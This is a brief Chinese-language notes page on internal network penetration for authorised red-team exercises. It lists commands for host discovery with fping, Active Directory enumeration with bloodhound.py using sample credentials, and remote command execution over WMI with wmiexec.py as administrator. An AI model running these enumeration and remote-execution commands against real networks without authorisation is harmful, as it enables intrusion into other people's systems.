---
title: 内网渗透
tags:
  - 网络安全
  - 内网渗透
---

## 介绍 / Introduction

内网渗透记录从边界突破到横向移动、权限维持的完整攻击链思路与工具使用。

!!! warning
    以下内容仅用于授权红队演练，禁止用于未授权访问。

## 常用工具

```bash
# 主机存活探测
fping -a -g 192.168.1.0/24 2>/dev/null

# 域信息收集
python bloodhound.py -d test.local -u admin -p 'P@ssw0rd' -ns 192.168.1.10
```

## PowerShell 横向移动示例

```powershell
# WMI 执行命令
wmiexec.py administrator:password@192.168.1.20 "whoami"
```
